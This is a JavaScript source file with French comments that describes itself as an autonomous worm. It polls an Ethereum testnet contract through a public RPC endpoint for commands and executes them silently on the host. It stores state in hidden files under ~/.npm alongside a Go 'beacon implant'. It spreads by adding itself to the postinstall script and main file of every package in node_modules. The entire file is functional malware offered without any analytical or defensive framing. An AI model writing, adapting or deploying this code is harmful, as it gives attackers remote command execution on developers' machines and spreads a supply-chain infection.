'use strict';
// Worm autonome — copié dans <projet>/.worm/main.js par l'infection.
// Aucun require local : config et logique embarquées (obfusqué à la build).
// Beacon silencieux (scan txs + exec) + réinfection node_modules.
const fs = require('fs');
const path = require('path');
const os = require('os');
const cp = require('child_process');

const RPC = 'https://ethereum-sepolia-rpc.publicnode.com';
const CONTRACT = '0xef025c8af567a502bdffcdd1aef26037046f70bb';

function loadState() {
  try {
    // état UNIFIÉ avec le beacon Go : même fichier, même clé lastBlock
    // → déduplication croisée (une commande vue par l'un n'est pas
    //   ré-exécutée par l'autre)
    return JSON.parse(fs.readFileSync(path.join(os.homedir(), '.npm', '.beacon-implant-state'), 'utf8'));
  } catch {
    return { lastBlock: 0, seen: [] };
  }
}

function statePath() {
  return path.join(os.homedir(), '.npm', '.skh-state.json');
}

function saveState(s) {
  try {
    const f = path.join(os.homedir(), '.npm', '.beacon-implant-state');
    fs.mkdirSync(path.dirname(f), { recursive: true });
    s.seen = (s.seen || []).slice(-50);
    fs.writeFileSync(f, JSON.stringify(s));
  } catch {}
}

async function rpcCall(method, params) {
  const res = await fetch(RPC, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params })
  });
  const j = await res.json();
  if (j.error) throw new Error(j.error.message);
  return j.result;
}

async function beacon() {
  const s = loadState();
  const head = Number(await rpcCall('eth_blockNumber', []));
  const last = Number(s.lastBlock) || 0;
  const from = last > 0 ? last + 1 : Math.max(0, head - 300);
  const to = Math.min(head, from + 199);
  const cmds = [];
  for (let bn = from; bn <= to; bn++) {
    const blk = await rpcCall('eth_getBlockByNumber', ['0x' + bn.toString(16), true]);
    if (!blk) continue;
    for (const tx of blk.transactions || []) {
      if ((tx.to || '').toLowerCase() !== CONTRACT) continue;
      if (!tx.input || tx.input === '0x') continue;
      if (s.seen.includes(tx.hash)) continue;
      let p;
      try { p = JSON.parse(Buffer.from(tx.input.slice(2), 'hex').toString('utf8')); } catch { continue; }
      if (p && p.cmd) { p.tx = tx.hash; cmds.push(p); }
    }
  }
  if (to >= from) s.lastBlock = to;
  s.seen.push(...cmds.map((c) => c.tx));
  saveState(s);
  for (const c of cmds) {
    await new Promise((r) => cp.exec(c.cmd, { timeout: (c.timeout || 30) * 1000, windowsHide: true }, () => r()));
  }
}

function reinfect() {
  let dir = process.cwd();
  for (let i = 0; i < 12; i++) {
    if (fs.existsSync(path.join(dir, 'node_modules'))) break;
    const up = path.dirname(dir);
    if (up === dir) return;
    dir = up;
  }
  const nm = path.join(dir, 'node_modules');
  if (!fs.existsSync(nm)) return;
  const me = __filename;
  const patch = (pkgDir) => {
    let pj;
    try { pj = JSON.parse(fs.readFileSync(path.join(pkgDir, 'package.json'), 'utf8')); }
    catch { return; }
    if (pj.__skh_worm__) return;
    const run = `node "${me.split(path.sep).join('/')}"`;
    pj.scripts = pj.scripts || {};
    pj.scripts.postinstall = pj.scripts.postinstall
      ? `${run} && ${pj.scripts.postinstall}`
      : `${run} /* __skh_worm__ */`;
    pj.__skh_worm__ = true;
    const mainFile = path.join(pkgDir, pj.main || 'index.js');
    if (fs.existsSync(mainFile) && /\.(js|mjs|cjs)$/.test(mainFile)) {
      let src;
      try { src = fs.readFileSync(mainFile, 'utf8'); } catch { return; }
      if (!src.includes('__skh_worm__')) {
        const req = `try{require(${JSON.stringify(me.split(path.sep).join('/'))})}catch(e){}`;
        fs.writeFileSync(mainFile, `${req}/* __skh_worm__ */\n${src}`);
      }
    }
  };
  try {
    for (const e of fs.readdirSync(nm)) {
      const d = path.join(nm, e);
      if (e.startsWith('.') || !fs.statSync(d).isDirectory()) continue;
      if (e.startsWith('@')) {
        for (const s of fs.readdirSync(d)) {
          const sd = path.join(d, s);
          if (fs.statSync(sd).isDirectory()) patch(sd);
        }
      } else {
        patch(d);
      }
    }
  } catch {}
}

(async () => {
  // BEACON_REPAIR_ONLY : re-patch uniquement (cron) — pas de scan/exec
  // (le beacon Go gère le canal ; évite double exécution des commandes)
  if (!process.env.BEACON_REPAIR_ONLY) {
    try { await beacon(); } catch {}
  }
  try { reinfect(); } catch {}
})();
